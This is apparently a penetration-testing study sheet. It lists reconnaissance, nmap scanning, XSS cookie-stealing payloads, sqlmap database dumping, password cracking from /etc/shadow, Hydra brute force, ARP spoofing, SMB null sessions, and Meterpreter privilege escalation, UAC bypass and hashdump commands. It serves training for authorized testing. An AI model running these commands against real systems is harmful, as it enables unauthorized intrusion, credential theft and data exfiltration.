# Junior Penetration Tester
This is a command and technique sheet for a junior penetration tester

## Information Gathering
- whois command
- Social networking 
- [crunchbase](https://www.crunchbase.com) (open-source intelligance): you can perform lookups by company name or people names

### Passive Subdomain Enumeration
- Google Dorking: type **site: <domain<domain>>** in search box
- [DNSdumpster](https://dnsdumpster.com)
- [virustotal](https://www.virustotal.com/gui/home/upload)
- Manually check SSL certificate and look for **Subject Alternative Name**, to automate the process you can use [Crt.sh](https://crt.sh/?q=%25.example.com)
- sublist3r command
```
python sublist3r.py -v -d <domain>
```

## Footprinting and Scanning
### Nmap 

```
-sT: TCP Connect Scan
-sU: UDP Scan
-sS: TCP SYN Scan (stealthy/default)
-sV: Service Version information
-sn: Port Scan
-O: operating system information
-p: custom ports
-sP: filtering (skip ports scan and just report the available hosts)
-Pn: skip host discovery (no ping requests)
--reason: to discover why a port is marked with a specific state (open, closed, filtered, etc)
```

Perform ping sweeping
```
nmap -sn <CIDR notation>
nmap -sn -iL hosts.txt       # -iL: input list
fping -a -g <CIDR notation>       # -a: only a live hosts, -g: ping sweeping
```

If nmap couldn't detect the version of a service, then there may be a firewall!
```
PORT    STATE  SERVICE  VERSION
#/port  open   http    
80/tcp  open   tcpwrapped       # tcpwrapped means the TCP handshake was successfully completed, but the target closed the connection 
```

### Masscan
Is another port scanning tool, but for large networks

### Routing
checking routes
```
route       # linux
ip route    # linux
route print     # windows
```

Add a network to current route
```
ip route add <CIDR notation> via <router addr> 
```

## Vulnerability Assessment
After performing an information gathering and ports scanning of a server, it is time to identify vulnerabilities </br>
Helpful resources:
- Nessus
- Searchsploit tool
- [Exploit Database](https://www.exploit-db.com/)
- Using search command in msfconsole

## Web Attacks

### Analyzing HTTP and HTTPS
#### HTTP banner grabbing
```
nc <target addr> <port#>     # to connect

HEAD / HTTP/1.0
Host: <domain>
```
#### HTTPS banner grabbing
```
openssl s_client -connect <target addr>:<port#>     # to connect

HEAD / HTTP/1.0
Host: <domain>
```
#### Httprint (signature-based technige)
```
httprint -P0 -h <target addr> -s <signature file>     # signature file: /usr/share/httprint/signatures.txt
```
#### HTTP verbs (methods)
GET, POST, DELETE, PUT, HEAD, etc </br>
*Note: use the OPTIONS verb to see what other verbs are available*

### Directories and File Enumeration
#### Dirbuster
It's a java application that performs directories and files enumeration on web resources
#### Dirb (linux tool)
```
dirb <domain>     # will use the default drib’s wordlist  
dirb <domain> <wordlist path>
```

### Cross Site Scripting (XSS)
XSS is a vulnerability that lets an attacker control some of the content of a web application </br>
User input can be:
- Request headers
- Cookies
- Form inputs
- POST parameters
- GET parameters
</br>   
XSS attack involves injecting a malicious code into the output of a webpage, then it will excute by victom browser! </br>
Check if the webpage is vulnerable to XSS attack:  </br>
   
```
<script>alert('I'm vulnerable!')</script>
<strong>Bold</strong>
```
If it's vulnerable, try to steal the cookie:
```
<script>alert(document.cookie)</script>
```
To automate the process you can use **XSSer** tool with **burp suit**

### SQL injection
#### sqlmap
It's a tool to automate SQLi detection and explotion </br></br>
Check if injection exists
```
sqlmap -u <url> -p <parameters>     # GET req 
sqlmap -u <url> --data=<parameters>     # POST req 
```
List all available DBs
```
sqlmap -u <url> -p <parameters> --dbs     # GET req 
```
Get table  names
```
sqlmap -u <url> -p <parameters> -D <db name> --tables     # GET req 
```
Get column names
```
sqlmap -u <url> -p <parameters> -D <db name> -T <table name> --columns     # GET req 
```
Finally, Get specific columns data
```
sqlmap -u <url> -p <parameters> -D <db name> -T <table name> -C col1,col2,... --dump     # GET req 
```

## Password Cracking
### Offline
#### John The Ripper (JTR)
Preparation
```
Unshadow /etc/passwd /etc/shadow > hashes     # cat etc/passwd (Where is the password file stored in Linux system)
```
Then
```
John –wordlist=/usr/share/john/password.txt -users=users.txt hashes
```

#### Hashcat 
```
hashcat -m 0 -a 0 <hash file> <wordlist path>     # -m: hash type(0=MD5), -a: attack mode(0=dictionary attack)
hashcat -m 0 -a 0 <hash file> <wordlist path> -r <path to rule file>     # rule-based attack, ref: https://hashcat.net/wiki/doku.php?id=rule_based_attack 
hashcat -m 0 -a 3 <hash file> ?l?l?l?l?l?a     # mask attack ref: https://hashcat.net/wiki/doku.php?id=mask_attack
```

### Live
#### Hydra
```
hydra <server> <service> “” -L <users path> -P <passwords path> -f -V 
```

## Network Attacks

### ARP Spoofing
Configure the machine to forward IP packets
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
Perform the ARP poisoning attack
```
arpspoof -i <Network Interface> -t <addr> -r <addr>
```

### Windows Shares Using Null Sessions
```
smbclient -L //<target addr> -N     # list all browsable shares on the target
nmblookup -A     # check if the File Sharing Server is available (<20> flag)
smbmap -H <target addr>     # check the permissions on share files
smbclient //<target addr>/<share file> -N     # Try to login without a username or password
```

### Metasploit
#### Basic Msfconsole Commands
```
Help
search <service>     # find exploits
use <exploit>     # select an exploit
info     # detailed info when an exploit is selected 
show options     # show you the available parameters for an exploit 
set <parameter name> <parameter value>    # set the parameters for an exploit
show targets     # list of OSs which are vulnerable to the selected exploit 
check
```
#### Meterpreter
```
shell
background
sessions -l
sessions -i 1
ps
sysinfo
getuid
getpid
getsystem     # privilege escalation
   # if privilege escalation denial 
   run post/windows/gather/win_privs
   search uac
   use exploit/windows/local/bypassuac
   set session
   migrate <pid>
download x /root/
upload x C:\\Windows
use post/windows/gather/hashdump
```
